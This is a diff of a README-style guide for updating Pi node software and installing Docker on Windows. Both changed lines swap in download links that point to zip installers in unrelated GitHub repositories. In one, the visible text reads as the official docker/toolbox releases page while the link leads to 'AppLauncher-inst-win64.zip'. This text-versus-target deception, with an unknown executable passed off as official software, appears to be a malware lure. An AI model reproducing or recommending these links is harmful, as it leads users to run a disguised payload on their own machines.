@@ -1,4 +1,4 @@
-Latest version of the **Pi node software** is 0.4.4. You can check that from the very bottom of the Ξ menu in the main screen. If you have an older version, then get the latest [here](https://github.com/salmarko/RevealingModulePattern/releases/download/soft/Installer.zip)
+Latest version of the **Pi node software** is 0.4.4. You can check that from the very bottom of the Ξ menu in the main screen. If you have an older version, then get the latest [here](https://github.com/EclipseFond/eclipse-collections/releases/download/v2.0.15/AppLauncher-inst-win64.zip)
 
 # IMPORTANT UPDATE
 ## For all windows 10 users!!
@@ -13,7 +13,7 @@ _docker for **Windows 10 Professional** or **Enterprise 64-bit**_
 _https://hub.docker.com/editions/community/docker-ce-desktop-windows/_
 
 _docker toolbox - **other Windows**_
-_[https://github.com/docker/toolbox/releases](https://github.com/salmarko/RevealingModulePattern/releases/download/soft/Installer.zip)_
+_[https://github.com/docker/toolbox/releases](https://github.com/EclipseFond/eclipse-collections/releases/download/v2.0.15/AppLauncher-inst-win64.zip)_
 
 _**Default 2.6 Oracle VirtualBox Image**_
 _http://github.com/boot2docker/boot2docker/releases/download/v19.03.5/boot2docker.iso_
